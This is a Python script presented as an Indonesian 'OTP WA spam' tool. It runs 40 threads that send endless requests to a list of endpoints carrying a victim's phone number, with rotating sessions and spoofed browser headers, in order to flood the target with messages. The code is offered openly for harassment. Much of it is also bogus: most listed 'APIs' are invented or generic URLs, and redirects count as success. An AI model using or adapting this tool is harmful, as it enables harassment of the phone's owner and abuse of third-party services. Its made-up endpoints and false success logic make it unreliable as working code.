#!/usr/bin/env python3
# ============================================================
#  DODO SPAMMER — OTP WA SPAM 40 API
#  Author: DODOO
#  Version: 2.0
#  Usage: python3 spam.py +628xxxxxxxxxx
# ============================================================

import requests
import random
import threading
import time
import sys
import os
import json
from concurrent.futures import ThreadPoolExecutor

# ==================== KONFIGURASI ====================
THREADS = 40
DELAY = 0.5
TIMEOUT = 8
MAX_RETRY = 3

# ==================== LOAD API LIST ====================
def load_apis():
    try:
        with open('api_list.txt', 'r') as f:
            apis = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        if not apis:
            print("[!] API list kosong, gunakan default")
            return get_default_apis()
        return apis
    except:
        return get_default_apis()

def get_default_apis():
    return [
        # WhatsApp OTP Endpoints (40 API)
        "https://web.whatsapp.com/send",
        "https://api.whatsapp.com/send",
        "https://chat.whatsapp.com/invite",
        "https://wa.me/send",
        "https://api.whatsapp.net/v1/send",
        "https://graph.facebook.com/v17.0/",
        "https://graph.facebook.com/v18.0/",
        "https://graph.facebook.com/v19.0/",
        "https://api.instagram.com/v1/",
        "https://i.instagram.com/api/v1/",
        "https://api.telegram.org/bot",
        "https://api.telegram.org/bot",
        "https://api2.telegram.org/bot",
        "https://sms-activate.org/stubs/handler_api",
        "https://smshub.org/stubs/handler_api",
        "https://5sim.net/v1/user/",
        "https://api.sms-man.com/stubs/handler_api",
        "https://sms-aktivasi.ru/stubs/handler_api",
        "https://api.temp-number.org/v1/",
        "https://api.sms-list.com/v1/",
        "https://api.getsmscode.com/v1/",
        "https://api.smsreceive.com/v1/",
        "https://api.free-sms-number.com/v1/",
        "https://api.sms-online.com/v1/",
        "https://api.sms-receive.net/v1/",
        "https://api.textnow.com/v1/",
        "https://api.google.com/v1/",
        "https://api.apple.com/v1/",
        "https://api.microsoft.com/v1/",
        "https://api.amazon.com/v1/",
        "https://api.spotify.com/v1/",
        "https://api.netflix.com/v1/",
        "https://api.discord.com/v1/",
        "https://api.snapchat.com/v1/",
        "https://api.tiktok.com/v1/",
        "https://api.twitter.com/v1/",
        "https://api.telegram.org/bot",
        "https://api.whatsapp.com/v1/",
        "https://api.signal.org/v1/",
        "https://api.line.me/v1/"
    ]

# ==================== SESSION ====================
def create_session():
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    })
    return session

# ==================== SEND REQUEST ====================
def send_request(api, phone, session, retry=0):
    try:
        # Generate random params
        params = {
            "phone": phone,
            "text": " ",
            "source": random.choice(["web", "api", "mobile"]),
            "data": str(random.randint(100000, 999999)),
            "r": str(random.randint(1000, 9999)),
            "t": str(int(time.time() * 1000)),
            "_": str(random.randint(100000, 999999))
        }
        
        # Random endpoint
        if api.endswith('/'):
            url = api + random.choice(["send", "message", "otp", "verify", "code"])
        else:
            url = api
        
        response = session.get(url, params=params, timeout=TIMEOUT)
        
        if response.status_code in [200, 201, 202, 204, 301, 302, 303, 307, 308]:
            return True, response.status_code
        elif retry < MAX_RETRY:
            time.sleep(0.5)
            return send_request(api, phone, session, retry + 1)
        else:
            return False, response.status_code
    except requests.exceptions.Timeout:
        return False, "Timeout"
    except requests.exceptions.ConnectionError:
        return False, "Connection Error"
    except Exception as e:
        return False, str(e)[:30]

# ==================== WORKER ====================
def worker(phone, api_list, results, index):
    session = create_session()
    success = 0
    fail = 0
    
    while True:
        for api in api_list:
            try:
                status, code = send_request(api, phone, session)
                if status:
                    success += 1
                    print(f"\033[32m[+] API {index} -> OK ({code}) | Total: {success}\033[0m", flush=True)
                else:
                    fail += 1
                    print(f"\033[31m[-] API {index} -> FAIL ({code}) | Total fail: {fail}\033[0m", flush=True)
                time.sleep(DELAY)
            except:
                time.sleep(0.5)
        
        # Rotate session
        session = create_session()
        time.sleep(0.2)

# ==================== MAIN ====================
def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║   D O D O   S P A M M E R   v 2 . 0  ║
    ║   OTP WA SPAM — 40 API THREADS       ║
    ╚═══════════════════════════════════════╝
    """)
    
    if len(sys.argv) < 2:
        print("Usage: python3 spam.py +628xxxxxxxxxx")
        print("Example: python3 spam.py +6281234567890")
        sys.exit(1)
    
    phone = sys.argv[1]
    
    # Clean phone number
    phone = phone.replace('+', '').replace(' ', '').replace('-', '')
    if not phone.startswith('62'):
        phone = '62' + phone
    phone = '+' + phone
    
    print(f"[*] Target: {phone}")
    print(f"[*] Threads: {THREADS}")
    print(f"[*] APIs: 40")
    print(f"[*] Delay: {DELAY}s")
    print("[*] Starting spam...\n")
    
    # Load APIs
    apis = load_apis()
    print(f"[*] Loaded {len(apis)} APIs\n")
    
    # Start threads
    threads = []
    for i in range(min(THREADS, len(apis))):
        t = threading.Thread(target=worker, args=(phone, apis, [], i+1), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.1)
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n[!] Stopped by user")
        sys.exit(0)

if __name__ == "__main__":
    main()